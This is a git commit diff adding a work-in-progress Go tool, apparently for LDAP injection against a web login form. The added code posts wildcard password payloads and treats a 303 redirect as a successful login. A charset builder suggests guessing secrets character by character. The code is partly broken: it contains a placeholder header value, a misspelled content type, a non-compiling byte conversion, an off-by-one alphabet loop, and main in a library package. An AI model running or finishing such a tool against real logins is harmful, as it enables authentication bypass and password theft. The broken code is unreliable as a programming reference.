69c13d1a84d394eb70b57c635c6bd0302a59fae5
sw4mpd0nkey <sw4mpd0nkey@protonmail.com>
2025-04-23 10:25:55 -0400

    ldap injector in progress

--- injectors/ldap-injector.go
+++ injectors/ldap-injector.go
@@ -1,6 +1,11 @@
 package injectors
 
-import "fmt"
+import (
+	"fmt"
+	"net/http"
+	"strconv"
+	"strings"
+)
 
 type LdapInjector struct {
 	Url      string
@@ -14,10 +19,55 @@ func NewLdapInjector(u, n string) *LdapInjector {
 	}
 }
 
-func (li *LdapInjector) TestPassword() {
-	fmt.Println("TestPassword")
+func (li *LdapInjector) TestPassword(password string) (bool, error) {
+	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{}, "$K1"]`,
+		li.Username, password)
+	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
+	if err != nil {
+		return false, err
+	}
+	req.Header.Set("Content-Type", "application/x-www-urlencoded")
+	req.Header.Set("Next-Action", "pull from burpsuite")
+
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false, err
+	}
+	defer resp.Body.Close()
+
+	return resp.StatusCode == 303, nil
 }
 
 func RunInject() {
 	fmt.Println("stiny")
+}
+
+func CreateCharset() string {
+	var charset []byte
+	for c := 'a'; c < 'z'; c++ {
+		charset = append(charset, byte(c))
+	}
+	for i := range 10 {
+		c := strconv.Itoa(i)
+		charset = append(charset, byte(c))
+	}
+	return string(charset)
+}
+
+func main() {
+	c := NewLdapInjector("http://scanme.nmap.org", "jubjub")
+	resp, err := c.TestPassword("*")
+
+	if err != nil {
+		fmt.Println("Error: ", err)
+		return
+	}
+
+	fmt.Println("Response: ", resp)
 }
